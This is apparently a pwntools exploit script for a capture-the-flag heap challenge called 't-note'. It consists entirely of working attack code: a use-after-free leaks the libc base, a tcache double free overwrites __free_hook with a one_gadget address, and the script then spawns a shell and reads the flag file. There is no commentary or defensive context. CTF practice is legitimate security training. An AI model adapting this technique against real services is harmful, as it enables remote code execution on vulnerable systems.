#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( 'libc-2.27.so' )

y = remote( 'localhost' , 10179 )
#y = remote( 'edu-ctf.csie.org' , 10179 )
#y = process( '../t-note/share/t-note' )
#pause()


def add( size , note ):
    y.sendafter( '>' , '1' )
    y.sendafter( 'Size: ' , str( size ) )
    y.sendafter( 'Note: ' , note )

def show( index ):
    y.sendafter( '>' , '2' )
    y.sendafter( 'Index: ' , str( index ) )

def delete( index ):
    y.sendafter( '>' , '3' )
    y.sendafter( 'Index: ' , str( index ) )


add( 0x410 , 'leak' ) # 0
add( 0x20 , 'a' ) # 1

delete( 0 )

show( 0 )
y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - 0x3ebca0
success( 'libc -> %s' % hex( l.address ) )

delete( 1 )
delete( 1 )

add( 0x20 , p64( l.sym.__free_hook ) )
add( 0x20 , 'a' )
add( 0x20 , p64( l.address + 0x4f322 ) )

delete( 0 )

sleep(0.1)
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()